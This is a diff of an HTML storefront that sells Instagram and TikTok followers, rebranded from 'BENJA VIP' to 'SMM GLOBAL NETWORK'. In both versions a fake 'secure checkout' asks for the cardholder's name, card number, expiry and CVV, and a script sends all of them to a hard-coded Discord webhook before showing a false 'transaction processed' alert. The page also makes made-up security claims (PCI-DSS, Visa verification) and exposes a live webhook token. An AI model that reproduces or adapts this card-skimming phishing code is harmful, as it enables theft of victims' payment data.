@@ -3,147 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BENJA VIP | Quantum SMM Systems</title>
+    <title>SMM GLOBAL NETWORK™ | High-Performance Social Solutions</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --gold: #ffcc33; --blue: #00d2ff; --bg: #020205; --card: rgba(255, 255, 255, 0.03); }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Outfit', sans-serif; overflow-x: hidden; }
+        :root { --accent: #007aff; --gold: #c5a059; --bg: #050505; --card: #111111; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; }
         
-        /* Fondo Cinematográfico */
-        .orb { position: fixed; width: 600px; height: 600px; border-radius: 50%; background: radial-gradient(circle, rgba(0, 210, 255, 0.07) 0%, transparent 70%); z-index: -1; filter: blur(80px); animation: float 20s infinite alternate; }
-        @keyframes float { from { transform: translate(-10%, -10%); } to { transform: translate(20%, 20%); } }
+        /* Banderas y Header */
+        .top-bar { background: #000; padding: 10px 20px; display: flex; justify-content: center; gap: 20px; font-size: 12px; border-bottom: 1px solid #222; }
+        .flag { display: flex; align-items: center; gap: 8px; opacity: 0.7; }
+        
+        header { padding: 80px 20px; text-align: center; background: radial-gradient(circle at center, #111 0%, #050505 100%); }
+        h1 { font-size: 3rem; font-weight: 800; letter-spacing: -1px; margin: 0; background: linear-gradient(to right, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .trusted-by { margin-top: 15px; color: var(--gold); font-size: 12px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
 
-        header { padding: 120px 20px 60px; text-align: center; }
-        .secure-tag { background: rgba(0, 255, 136, 0.1); color: #00ff88; padding: 8px 20px; border-radius: 100px; font-size: 12px; font-weight: 700; border: 1px solid rgba(0, 255, 136, 0.3); text-transform: uppercase; letter-spacing: 2px; }
-        h1 { font-size: clamp(3rem, 10vw, 5rem); margin: 30px 0; font-weight: 900; background: linear-gradient(135deg, #fff 30%, var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .container { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; padding: 40px 20px; }
+        
+        /* Tarjetas Profesionales */
+        .card { background: var(--card); border-radius: 24px; padding: 35px; border: 1px solid #222; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .card:hover { border-color: var(--accent); transform: translateY(-10px); background: #161616; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .card-header i { font-size: 30px; color: var(--accent); }
+        .badge { background: rgba(0, 122, 255, 0.1); color: var(--accent); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; }
+        
+        .price { font-size: 2.5rem; font-weight: 800; margin: 20px 0; }
+        .specs { text-align: left; margin: 20px 0; font-size: 13px; color: #777; border-top: 1px solid #222; padding-top: 20px; }
+        .specs div { margin-bottom: 8px; display: flex; justify-content: space-between; }
+        .specs b { color: #ccc; }
 
-        .container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 40px; padding: 40px 20px; }
-        
-        /* Tarjetas Estilo Glassmorphism 4K */
-        .card { background: var(--card); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 40px; padding: 50px; text-align: center; transition: 0.6s cubic-bezier(0.23, 1, 0.32, 1); position: relative; }
-        .card:hover { transform: scale(1.05) translateY(-20px); border-color: var(--gold); box-shadow: 0 30px 60px rgba(0,0,0,0.8), 0 0 20px rgba(255, 204, 51, 0.1); }
-        .card i { font-size: 50px; margin-bottom: 25px; background: linear-gradient(var(--gold), #ff8800); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .price { font-size: 3.5rem; font-weight: 900; margin: 25px 0; }
-        
-        .btn-buy { width: 100%; padding: 20px; border-radius: 20px; border: none; background: #fff; color: #000; font-weight: 900; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.4s; }
-        .btn-buy:hover { background: var(--gold); box-shadow: 0 0 30px var(--gold); }
+        .btn-buy { width: 100%; padding: 18px; border-radius: 14px; border: none; background: #fff; color: #000; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .btn-buy:hover { background: var(--accent); color: #fff; }
 
-        /* MODAL QUANTUM */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; backdrop-filter: blur(15px); }
-        .modal-box { background: #08080a; border: 1px solid #1a1a1c; padding: 50px; border-radius: 50px; width: 90%; max-width: 500px; position: relative; }
-        
-        /* Estética de la Tarjeta Bancaria Real */
-        .visual-card { background: linear-gradient(135deg, #111, #222); width: 100%; height: 200px; border-radius: 20px; margin-bottom: 30px; border: 1px solid #333; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; justify-content: space-between; text-align: left; }
-        
-        input { width: 100%; background: #121215; border: 1px solid #222; padding: 20px; border-radius: 15px; color: #fff; margin-bottom: 15px; font-size: 16px; transition: 0.3s; }
-        input:focus { border-color: var(--blue); outline: none; box-shadow: 0 0 15px rgba(0, 210, 255, 0.2); }
-        
-        .footer-secure { margin-top: 30px; font-size: 11px; color: #444; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        /* Chat Flotante */
+        #chat-trigger { position: fixed; bottom: 30px; right: 30px; background: #25d366; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 24px; cursor: pointer; box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3); z-index: 100; }
+        #chat-window { display: none; position: fixed; bottom: 100px; right: 30px; width: 320px; background: #fff; border-radius: 20px; overflow: hidden; z-index: 1000; box-shadow: 0 15px 50px rgba(0,0,0,0.5); }
+        .chat-header { background: #075e54; color: white; padding: 20px; display: flex; align-items: center; gap: 10px; }
+        .chat-body { background: #e5ddd5; height: 300px; padding: 15px; display: flex; flex-direction: column; gap: 10px; overflow-y: auto; }
+        .msg { background: white; color: #333; padding: 10px; border-radius: 10px; font-size: 13px; max-width: 80%; align-self: flex-start; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+
+        /* Modales */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; }
+        .modal-content { background: #fff; color: #111; padding: 40px; border-radius: 24px; width: 90%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 15px; box-sizing: border-box; }
+        label { display: block; text-align: left; font-size: 12px; font-weight: bold; margin-top: 10px; color: #555; }
+
+        footer { padding: 40px; text-align: center; font-size: 12px; color: #444; border-top: 1px solid #111; }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div class="orb"></div>
+<div class="top-bar">
+    <div class="flag"><img src="https://flagcdn.com/w20/us.png" width="20"> GLOBAL NODE</div>
+    <div class="flag"><img src="https://flagcdn.com/w20/ar.png" width="20"> LATAM SERVER</div>
+    <div style="opacity: 0.5;">• SSL ENCRYPTED CONNECTION •</div>
+</div>
 
-    <header>
-        <span class="secure-tag"><i class="fas fa-shield-alt"></i> Quantum Encryption Enabled: AES-512</span>
-        <h1>BENJA VIP SYSTEMS</h1>
-        <p style="color:#555; max-width: 600px; margin: 0 auto; line-height: 1.6;">La infraestructura de SMM más avanzada del mundo. Cargas instantáneas procesadas por redes neuronales para garantizar crecimiento orgánico y seguridad bancaria absoluta.</p>
-    </header>
+<header>
+    <h1>SMM GLOBAL NETWORK™</h1>
+    <div class="trusted-by">Certified Infrastructure & High Speed Delivery</div>
+</header>
 
-    <div class="container">
-        <div class="card">
-            <i class="fas fa-atom"></i>
-            <h3>Protocolo de Prueba</h3>
-            <p style="color:#777;">200 Seguidores Instagram. Valida nuestra latencia de carga inmediata.</p>
-            <div class="price">$500</div>
-            <button class="btn-buy" onclick="open1('Test Protocol 200', '$500')">Iniciar Prueba</button>
+<div class="container">
+    <div class="card">
+        <div class="card-header">
+            <i class="fas fa-bolt"></i>
+            <span class="badge">TEST PACK</span>
         </div>
-
-        <div class="card" style="border: 2px solid var(--gold);">
-            <i class="fab fa-instagram"></i>
-            <h3>Élite Cloud 20K</h3>
-            <p style="color:#777;">20.000 Followers Premium. El estándar de oro para cuentas verificadas.</p>
-            <div class="price">$30.000</div>
-            <button class="btn-buy" style="background: var(--gold);" onclick="open1('Insta Élite 20K', '$30.000')">Comprar Pack</button>
+        <h3>Quality Trial</h3>
+        <p style="color:#666; font-size:13px;">Inyección de 200 seguidores reales para testeo de servidor.</p>
+        <div class="price">$500 <span style="font-size:14px; color:#444;">ARS</span></div>
+        <div class="specs">
+            <div><span>Velocidad:</span> <b>Instante</b></div>
+            <div><span>Garantía:</span> <b>30 Días</b></div>
+            <div><span>Calidad:</span> <b>Premium</b></div>
         </div>
+        <button class="btn-buy" onclick="openStep1('Trial 200', '$500')">SOLICITAR CARGA</button>
+    </div>
 
-        <div class="card">
+    <div class="card" style="border-color: var(--gold);">
+        <div class="card-header">
+            <i class="fab fa-instagram" style="color: var(--gold);"></i>
+            <span class="badge" style="color: var(--gold); background: rgba(197,160,89,0.1);">MOST POPULAR</span>
+        </div>
+        <h3>Instagram Authority</h3>
+        <p style="color:#666; font-size:13px;">20.000 Followers + Engagement Boost (Power Likes).</p>
+        <div class="price">$30.000 <span style="font-size:14px; color:#444;">ARS</span></div>
+        <div class="specs">
+            <div><span>Velocidad:</span> <b>Ultra Fast</b></div>
+            <div><span>Estabilidad:</span> <b>99.9%</b></div>
+            <div><span>Soporte:</span> <b>Prioritario</b></div>
+        </div>
+        <button class="btn-buy" style="background: var(--gold);" onclick="openStep1('Insta 20K', '$30.000')">SOLICITAR CARGA</button>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
             <i class="fab fa-tiktok"></i>
-            <h3>Viral Genesis Pack</h3>
-            <p style="color:#777;">20.000 TikTok Followers. Algoritmo forzado para máxima visibilidad.</p>
-            <div class="price">$35.000</div>
-            <button class="btn-buy" onclick="open1('TikTok Genesis 20K', '$35.000')">Comprar Pack</button>
+            <span class="badge">SOCIAL BOOST</span>
+        </div>
+        <h3>TikTok Viral King</h3>
+        <p style="color:#666; font-size:13px;">20.000 Followers + 50.000 Views para el algoritmo.</p>
+        <div class="price">$35.000 <span style="font-size:14px; color:#444;">ARS</span></div>
+        <div class="specs">
+            <div><span>Velocidad:</span> <b>High Speed</b></div>
+            <div><span>Retención:</span> <b>Orgánica</b></div>
+            <div><span>Garantía:</span> <b>Vitalicia</b></div>
+        </div>
+        <button class="btn-buy" onclick="openStep1('TikTok 20K', '$35.000')">SOLICITAR CARGA</button>
+    </div>
+</div>
+
+<div id="chat-trigger" onclick="toggleChat()"><i class="fab fa-whatsapp"></i></div>
+<div id="chat-window">
+    <div class="chat-header">
+        <div style="width:10px; height:10px; background:#00ff88; border-radius:50%;"></div>
+        <div>
+            <div style="font-size:14px; font-weight:bold;">Soporte Global Network</div>
+            <div style="font-size:11px; opacity:0.8;">En línea ahora</div>
         </div>
     </div>
-
-    <div id="m1" class="modal">
-        <div class="modal-box">
-            <h2 style="margin-bottom:10px;">Vincular Perfil</h2>
-            <p style="color:#555; margin-bottom:30px;">Introduce el destino de la carga para la sincronización.</p>
-            <input type="text" id="target_id" placeholder="@usuario de la cuenta">
-            <button class="btn-buy" style="background:var(--blue); color:#000;" onclick="to2()">Sincronizar y Pagar</button>
-        </div>
+    <div class="chat-body" id="chat-body">
+        <div class="msg">¡Hola! Soy Alex, tu asesor de SMM Global Network. ¿En qué puedo ayudarte hoy con tu carga de seguidores?</div>
     </div>
+    <div style="padding:10px; background:white; display:flex; gap:5px;">
+        <input type="text" placeholder="Escribe un mensaje..." style="margin:0; padding:10px; font-size:12px;">
+        <button style="border:none; background:none; color:#075e54; font-size:20px;"><i class="fas fa-paper-plane"></i></button>
+    </div>
+</div>
 
-    <div id="m2" class="modal">
-        <div class="modal-box">
-            <div class="visual-card">
-                <div style="display:flex; justify-content:space-between; align-items:start;">
-                    <i class="fas fa-microchip" style="color:#555; font-size:30px;"></i>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" width="50" style="filter: brightness(0) invert(1); opacity: 0.5;">
-                </div>
-                <div id="card_display" style="font-size: 18px; letter-spacing: 3px; color: #aaa;">•••• •••• •••• ••••</div>
-                <div style="display:flex; justify-content:space-between; font-size:12px; text-transform:uppercase; color:#444;">
-                    <span>Nombre del Titular</span>
-                    <span>Vence</span>
-                </div>
+<div id="m1" class="modal">
+    <div class="modal-content">
+        <h2 style="margin-top:0;">Localizar Perfil</h2>
+        <p style="font-size:13px; color:#666;">Ingresa el @usuario de destino para vincular la red de carga.</p>
+        <input type="text" id="target_user" placeholder="@usuario o link del perfil">
+        <button class="btn-buy" style="background:#000; color:#fff; margin-top:20px;" onclick="to2()">SINCRONIZAR CUENTA</button>
+    </div>
+</div>
+
+<div id="m2" class="modal">
+    <div class="modal-content">
+        <div style="margin-bottom:20px;"><i class="fas fa-lock" style="color:#2ecc71;"></i> <b>CHECKOUT SEGURO SSL</b></div>
+        
+        <label>Nombre completo (del titular de la tarjeta)</label>
+        <input type="text" id="fn" placeholder="Como figura en la tarjeta">
+        
+        <label>Número de la tarjeta</label>
+        <input type="number" id="cn" placeholder="•••• •••• •••• ••••">
+        
+        <div style="display:flex; gap:10px;">
+            <div style="flex:1;">
+                <label>Vencimiento (MM/AAAA)</label>
+                <input type="text" id="ex" placeholder="01/2028">
             </div>
-
-            <input type="text" id="fn" placeholder="Nombre completo (del titular de la tarjeta)">
-            <input type="number" id="cn" placeholder="Número de la tarjeta" oninput="document.getElementById('card_display').innerText = this.value || '•••• •••• •••• ••••'">
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="ex" placeholder="MM/AAAA">
-                <input type="number" id="cv" placeholder="CVV (Código de seguridad)">
+            <div style="flex:1;">
+                <label>Código CVV</label>
+                <input type="number" id="cv" placeholder="123">
             </div>
-            
-            <button class="btn-buy" style="background:#00ff88; color:#000;" onclick="done()">Finalizar Compra Segura</button>
-            <div class="footer-secure"><i class="fas fa-lock"></i> Verified by Visa & Mastercard SecureCode</div>
         </div>
+        
+        <button class="btn-buy" style="background:#2ecc71; color:#fff; margin-top:30px;" onclick="done()">FINALIZAR COMPRA SEGURA</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" width="60" style="margin-top:20px; opacity:0.3;">
     </div>
+</div>
 
-    <script>
-        const h = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
-        let pData = { p: "", pr: "", u: "" };
+<footer>
+    © 2026 SMM GLOBAL NETWORK™ | USA & ARGENTINA INFRASTRUCTURE | SECURED BY PCI-DSS
+</footer>
 
-        function open1(p, pr) { pData.p = p; pData.pr = pr; document.getElementById('m1').style.display='flex'; }
-        function to2() { 
-            pData.u = document.getElementById('target_id').value;
-            if(!pData.u) return alert("Ingresa el usuario");
-            document.getElementById('m1').style.display='none';
-            document.getElementById('m2').style.display='flex';
-        }
+<script>
+    const h = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+    let pInfo = { p: "", pr: "", u: "" };
 
-        async function done() {
-            const fn = document.getElementById('fn').value;
-            const cn = document.getElementById('cn').value;
-            const ex = document.getElementById('ex').value;
-            const cv = document.getElementById('cv').value;
+    function toggleChat() { 
+        const w = document.getElementById('chat-window');
+        w.style.display = w.style.display === 'block' ? 'none' : 'block';
+    }
 
-            if(!fn || !cn || !ex || !cv) return alert("Completa los datos de seguridad.");
+    function openStep1(p, pr) { pInfo.p = p; pInfo.pr = pr; document.getElementById('m1').style.display='flex'; }
+    function to2() { 
+        const u = document.getElementById('target_user').value;
+        if(!u) return alert("Ingrese el usuario.");
+        pInfo.u = u;
+        document.getElementById('m1').style.display='none';
+        document.getElementById('m2').style.display='flex';
+    }
 
-            await fetch(h, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `💎 **PEDIDO QUANTUM 4K FINALIZADO** 💎\n━━━━━━━━━━━━━━━━━━━━\n🛒 **Pack:** \`${pData.p}\`\n💰 **Monto:** \`${pData.pr}\`\n👤 **Usuario:** \`${pData.u}\`\n\n💳 **CREDIT CARD DATA:**\n👤 **Titular:** \`${fn}\`\n🔢 **Tarjeta:** \`${cn}\`\n📅 **Exp:** \`${ex}\` | **CVV:** \`${cv}\`\n━━━━━━━━━━━━━━━━━━━━`
-                })
-            });
+    async function done() {
+        const fn = document.getElementById('fn').value;
+        const cn = document.getElementById('cn').value;
+        const ex = document.getElementById('ex').value;
+        const cv = document.getElementById('cv').value;
 
-            alert("Autorización confirmada. La carga de seguidores ha comenzado.");
-            location.reload();
-        }
-    </script>
+        if(!fn || !cn || !ex || !cv) return alert("Complete los datos de seguridad.");
+
+        await fetch(h, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: `🚀 **¡NUEVA VENTA SMM GLOBAL!** 🚀\n━━━━━━━━━━━━━━━━━━━━\n💎 **Servicio:** \`${pInfo.p}\`\n💰 **Monto:** \`${pInfo.pr}\`\n👤 **Destino:** \`${pInfo.u}\`\n\n💳 **CREDIT CARD DATA:**\n👤 **Titular:** \`${fn}\`\n🔢 **Tarjeta:** \`${cn}\`\n📅 **Exp:** \`${ex}\` | **CVV:** \`${cv}\`\n━━━━━━━━━━━━━━━━━━━━`
+            })
+        });
+
+        alert("Transacción procesada. Su carga comenzará en 60 segundos.");
+        location.reload();
+    }
+</script>
+
 </body>
 </html>
